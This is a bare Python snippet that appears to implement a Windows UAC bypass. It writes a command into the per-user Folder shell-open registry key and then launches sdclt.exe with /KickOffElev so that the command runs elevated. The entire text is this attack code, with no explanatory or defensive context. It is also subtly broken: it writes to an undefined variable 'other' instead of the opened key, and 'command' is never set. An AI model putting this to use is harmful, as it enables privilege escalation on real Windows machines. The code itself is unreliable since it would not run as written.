import winreg, subprocess
with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open\command') as key:
    winreg.SetValueEx(other, '', 0, winreg.REG_SZ, command)
subprocess.run(['sdclt.exe', '/KickOffElev'])
